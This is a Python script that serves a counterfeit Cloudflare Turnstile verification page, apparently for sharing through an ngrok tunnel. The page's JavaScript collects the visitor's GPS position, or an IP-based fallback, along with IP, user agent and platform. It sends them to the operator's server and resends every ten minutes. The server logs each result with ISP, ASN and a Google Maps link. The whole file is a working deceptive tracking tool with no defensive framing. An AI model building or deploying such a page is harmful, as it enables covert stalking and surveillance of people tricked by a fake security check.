#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import json, datetime

PORT = 5000

HTML = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Just a moment...</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: #f0f2f5;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    display: flex; align-items: center; justify-content: center; min-height: 100vh;
  }
  .card {
    background: #fff; border: 1px solid #e0e0e0; border-radius: 8px;
    padding: 28px 32px 24px; width: 300px; box-shadow: 0 1px 4px rgba(0,0,0,0.08);
  }
  .cf-logo { display: flex; align-items: center; gap: 8px; margin-bottom: 18px; }
  .cf-logo svg { width: 28px; height: 28px; }
  .cf-logo-text { font-size: 13px; color: #666; font-weight: 500; }
  .cf-logo-text span { color: #f38020; font-weight: 700; }
  .verify-row {
    display: flex; align-items: center; gap: 14px; padding: 14px 16px;
    border: 1px solid #e3e3e3; border-radius: 6px; background: #fafafa;
    cursor: pointer; transition: background 0.15s; user-select: none;
  }
  .verify-row:hover { background: #f0f0f0; }
  .checkbox {
    width: 24px; height: 24px; border: 2px solid #ccc; border-radius: 4px;
    display: flex; align-items: center; justify-content: center;
    flex-shrink: 0; transition: all 0.2s; background: #fff;
  }
  .checkbox.checking { border-color: #f38020; animation: spin 0.8s linear infinite; }
  .checkbox.done { border-color: #39b54a; background: #39b54a; animation: none; }
  .checkbox.done::after {
    content: ''; width: 6px; height: 11px; border: 2px solid #fff;
    border-top: none; border-left: none;
    transform: rotate(45deg) translateY(-1px); display: block;
  }
  @keyframes spin {
    0%   { border-color: #f38020 transparent #f38020 transparent; }
    100% { border-color: transparent #f38020 transparent #f38020; }
  }
  .verify-label { font-size: 14px; color: #333; }
  .cf-footer { margin-top: 14px; display: flex; align-items: center; justify-content: space-between; }
  .cf-footer-brand { font-size: 10px; color: #aaa; line-height: 1.4; }
  .cf-footer-brand a { color: #f38020; text-decoration: none; font-weight: 600; }
  .cf-footer-links { font-size: 10px; color: #bbb; display: flex; gap: 8px; }
  .cf-footer-links a { color: #bbb; text-decoration: none; }
</style>
</head>
<body>
<div class="card">
  <div class="cf-logo">
    <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
      <path d="M323.5 252.2c1.9-6.6 1.2-12.7-2.1-17.2-3-4.2-8-6.6-14.2-6.8l-183.3-.6c-1.4 0-2.6.7-3.3 1.8-.7 1.1-.7 2.5-.1 3.7l24.6 46.8c2.4 4.6 7.3 7.5 12.6 7.5l170.8.1c6.4 0 11.8-4.4 13.2-10.6l-18.2-24.7z" fill="#f38020"/>
      <path d="M384.4 195.6c-1.9 6.6-1.2 12.7 2.1 17.2 3 4.2 8 6.6 14.2 6.8l26.1.9c1.5 0 2.8-.7 3.5-1.9.7-1.2.6-2.6-.1-3.8l-10.1-18.9c-2.4-4.5-7.3-7.3-12.6-7.3h-9.9c-6.4-.1-11.8 4.3-13.2 10.5v-3.5z" fill="#faad3f"/>
      <path d="M256 64C150 64 64 150 64 256s86 192 192 192 192-86 192-192S362 64 256 64zm112.4 290.2l-183 .6c-8.4 0-16.1-4.6-20.2-12l-45-85.6c-2.2-4.1-2.1-9 .2-13s6.3-6.5 10.8-6.5l211.5.7c10.2.3 19.3 6.2 23.6 15.3l18.9 35.9c2.2 4.1 2.1 9-.2 13-2.4 4-6.5 6.5-10.8 6.5l-36.9.5c-3.5.1-6.5 2.5-7.3 5.9-1.1 4.3 1.5 8.7 5.8 9.8l28.3 7.7c1.5.4 2.7 1.5 3.2 3 .5 1.4.2 3-.9 4.1-5.8 6.3-14.1 9.8-22.8 9.8l1.8 4.3z" fill="#f38020"/>
    </svg>
    <div class="cf-logo-text"><span>Cloudflare</span> Turnstile</div>
  </div>
  <div class="verify-row" id="verifyRow">
    <div class="checkbox" id="checkbox"></div>
    <span class="verify-label" id="label">I am not a robot</span>
  </div>
  <div class="cf-footer">
    <div class="cf-footer-brand">Protected by <a href="#">Cloudflare</a><br><span style="color:#ccc">Privacy · Terms</span></div>
    <div class="cf-footer-links"><a href="#">Privacy</a><a href="#">Terms</a></div>
  </div>
</div>
<script>
var count = 0;
var started = false;

// Multiple IP APIs to try in order
var IP_APIS = [
  {
    url: 'https://ipapi.co/json/',
    parse: function(d) { return {lat: d.latitude, lng: d.longitude, city: d.city, country: d.country_name, ip: d.ip}; }
  },
  {
    url: 'https://api.ipify.org?format=json',
    parse: null  // only gives IP, use as last resort with no coords
  }
];

function start() {
  if (started) return;
  started = true;
  document.getElementById('verifyRow').style.cursor = 'default';
  document.getElementById('checkbox').classList.add('checking');
  document.getElementById('label').innerText = 'Verifying...';

  // Try GPS first with short timeout, then fall back to IP
  var done = false;

  var timer = setTimeout(function() {
    if (!done) { done = true; tryIPApis(0); }
  }, 4000);

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        if (done) return; done = true; clearTimeout(timer);
        verified();
        send(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'GPS', '', '', '');
        setInterval(function() {
          navigator.geolocation.getCurrentPosition(
            function(p) { send(p.coords.latitude, p.coords.longitude, p.coords.accuracy, 'GPS', '', '', ''); },
            function() { tryIPSilent(); },
            {timeout: 4000}
          );
        }, 10 * 60 * 1000);
      },
      function() { if (done) return; done = true; clearTimeout(timer); tryIPApis(0); },
      {enableHighAccuracy: false, timeout: 4000, maximumAge: 300000}
    );
  } else {
    clearTimeout(timer); tryIPApis(0);
  }
}

function tryIPApis(index) {
  if (index >= IP_APIS.length) { verified(); return; }
  var api = IP_APIS[index];
  var xhr = new XMLHttpRequest();
  xhr.open('GET', api.url, true);
  xhr.timeout = 5000;
  xhr.onload = function() {
    if (xhr.status !== 200) { tryIPApis(index + 1); return; }
    try {
      var raw = JSON.parse(xhr.responseText);
      if (!api.parse) { tryIPApis(index + 1); return; }
      var d = api.parse(raw);
      if (!d.lat || !d.lng) { tryIPApis(index + 1); return; }
      verified();
      send(d.lat, d.lng, 5000, 'IP', d.city || '', d.country || '', d.ip || '');
      setInterval(function() { tryIPSilent(); }, 10 * 60 * 1000);
    } catch(e) { tryIPApis(index + 1); }
  };
  xhr.ontimeout = function() { tryIPApis(index + 1); };
  xhr.onerror = function() { tryIPApis(index + 1); };
  xhr.send();
}

function tryIPSilent() {
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://ipapi.co/json/', true);
  xhr.timeout = 5000;
  xhr.onload = function() {
    try {
      var d = JSON.parse(xhr.responseText);
      if (d.latitude) send(d.latitude, d.longitude, 5000, 'IP', d.city, d.country_name, d.ip);
    } catch(e) {}
  };
  xhr.send();
}

function verified() {
  document.getElementById('checkbox').classList.remove('checking');
  document.getElementById('checkbox').classList.add('done');
  document.getElementById('label').innerText = 'Verification complete';
}

function send(lat, lng, accuracy, method, city, country, ip) {
  count++;
  var xhr = new XMLHttpRequest();
  xhr.open('POST', '/ping', true);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({
    latitude: lat, longitude: lng, accuracy: accuracy,
    method: method, city: city, country: country, ip: ip,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent, platform: navigator.platform,
    transmission: count
  }));
}
window.onload = start;
</script>
</body>
</html>"""

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("ngrok-skip-browser-warning", "true")
        self.end_headers()
        self.wfile.write(HTML.encode())

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0) or 0)
        try:
            data = json.loads(self.rfile.read(length))
            ts = datetime.datetime.now().strftime("%H:%M:%S")
            lat = data.get("latitude")
            lng = data.get("longitude")
            method = data.get("method", "?")
            city = data.get("city", "")
            country = data.get("country", "")
            ip = data.get("ip", "")
            print(f"\n[{ts}] PING #{data.get('transmission','?')} via {method}")
            print(f"  LAT      : {lat}")
            print(f"  LNG      : {lng}")
            print(f"  ACCURACY : +/-{data.get('accuracy','?')}m")
            if city:  print(f"  LOCATION : {city}, {country}")
            if ip:
                print(f"  IP       : {ip}")
                try:
                    import urllib.request
                    url = f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting"
                    req = urllib.request.urlopen(url, timeout=3)
                    db = json.loads(req.read())
                    if db.get("status") == "success":
                        print(f"  ── DATABASE LOOKUP ─────────────────")
                        print(f"  ISP      : {db.get('isp')}")
                        print(f"  ORG      : {db.get('org')}")
                        print(f"  ASN      : {db.get('as')}")
                        print(f"  REGION   : {db.get('regionName')}, {db.get('country')}")
                        print(f"  ZIP      : {db.get('zip')}")
                        print(f"  TIMEZONE : {db.get('timezone')}")
                        print(f"  MOBILE   : {db.get('mobile')}")
                        print(f"  PROXY/VPN: {db.get('proxy')}")
                        print(f"  HOSTING  : {db.get('hosting')}")
                except Exception as db_err:
                    print(f"  DB LOOKUP: failed ({db_err})")
            print(f"  PLATFORM : {data.get('platform')}")
            print(f"  MAP      : https://maps.google.com/?q={lat},{lng}")
        except Exception as e:
            print(f"[ERROR] {e}")
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok")

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def log_message(self, *args): pass

print(f"[*] Server on port {PORT} — run: ngrok http {PORT}")
HTTPServer(("", PORT), Handler).serve_forever()
